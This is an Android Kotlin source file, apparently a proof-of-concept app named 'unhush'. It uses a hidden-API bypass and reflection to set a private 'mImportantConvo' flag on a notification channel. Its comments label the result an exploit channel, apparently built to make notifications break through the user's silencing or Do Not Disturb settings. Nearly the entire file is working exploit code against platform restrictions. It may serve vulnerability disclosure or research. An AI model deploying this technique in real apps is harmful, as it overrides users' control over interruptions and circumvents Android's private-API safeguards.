package me.sithi.unhush

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Person
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ShortcutInfo
import android.content.pm.ShortcutManager
import android.os.Build
import android.os.Bundle
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.core.view.WindowCompat
import com.wind.hiddenapi.bypass.HiddenApiBypass
import me.sithi.unhush.databinding.ActivityMainBinding

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private val request =
        registerForActivityResult(
            ActivityResultContracts.RequestPermission()
        ) { ok: Boolean ->
            if (!ok) {
                Toast.makeText(this,
                    "No permission to show notifications",
                    Toast.LENGTH_LONG)
                    .show();
                finish()
            }
        }

    @SuppressLint("BlockedPrivateApi")
    override fun onCreate(savedInstanceState: Bundle?) {
        WindowCompat.setDecorFitsSystemWindows(window, false)
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        setSupportActionBar(binding.toolbar)

        /* hidden API bypass for reflective access to NotificationChannel */
        HiddenApiBypass.startBypass()

        /* notification permission request for T or later */
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
            ContextCompat.checkSelfPermission(this, android.Manifest.permission.POST_NOTIFICATIONS)
            != PackageManager.PERMISSION_GRANTED)
            request.launch(android.Manifest.permission.POST_NOTIFICATIONS)

        /* services */
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        val sm = getSystemService(Context.SHORTCUT_SERVICE) as ShortcutManager

        /* a parent channel is needed for conversations */
        nm.createNotificationChannel(
            NotificationChannel("Parent", "Parent", NotificationManager.IMPORTANCE_HIGH)
        )

        /* create a shortcut for the conversation */
        val s = ShortcutInfo.Builder(this, "Exploit Shortcut")
            .setActivity(ComponentName(packageName,
                "$packageName.MainActivity"))
            .setShortLabel("Exploit")
            .setIntent(Intent(""))  // needed by ShortcutManager
            .setLongLived(true)  // needed by NotificationManager
            .build()
        sm.pushDynamicShortcut(s)

        /* the actual exploit channel */
        val n = NotificationChannel("Exploit", "Exploit Channel",
            NotificationManager.IMPORTANCE_HIGH)

        /*
           mark it as a proper conversation by associating
           it with a parent and a shortcut
        */
        n.setConversationId("Parent","Exploit Shortcut")

        /* reflect and modify mImportantConvo */
        val f = n.javaClass.getDeclaredField("mImportantConvo")
        f.isAccessible = true
        f.set(n, true)

        /* register the exploit channel */
        nm.createNotificationChannel(n)

        binding.button.setOnClickListener {
            val nb: Notification.Builder = Notification.Builder(this, "Exploit")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setShortcutId("Exploit Shortcut")
                .setStyle(
                    // required for conversation-style notifications
                    Notification.MessagingStyle(
                        Person.Builder()
                            .setName(":)")
                            .build()
                    )
                )
            nm.notify(1, nb.build())
        }

    }
}